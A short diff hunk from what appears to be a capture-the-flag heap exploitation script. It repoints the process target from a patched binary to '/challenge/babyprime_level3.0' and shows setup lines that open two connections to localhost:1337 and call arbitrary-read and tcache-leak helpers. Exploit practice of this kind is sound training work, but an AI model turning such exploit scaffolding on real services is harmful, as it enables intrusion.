@@ -98,7 +98,7 @@ def arbitrary_read(r1, r2, addr, heap_base_addr):
 	
 	
 
-p = process('./babyprime_level3.0_patched')
+p = process('/challenge/babyprime_level3.0')
 r1 = remote("localhost", 1337)
 r2 = remote("localhost", 1337)
 leak = leak_tcache(r1, r2)
